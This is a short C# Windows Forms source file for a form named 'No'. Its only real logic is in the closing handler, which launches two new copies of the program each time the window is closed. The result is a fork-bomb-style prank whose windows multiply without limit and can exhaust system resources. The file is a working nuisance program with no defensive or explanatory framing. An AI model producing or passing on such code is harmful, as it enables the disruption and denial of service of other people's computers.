using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace No
{
    public partial class No : Form
    {
        public No()
        {
            InitializeComponent();
        }

        private void No_Load(object sender, EventArgs e)
        {
            
        }

        private void No_FormClosing(object sender, FormClosingEventArgs e)
        {
            Process.Start(Application.ExecutablePath);
            Process.Start(Application.ExecutablePath);
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
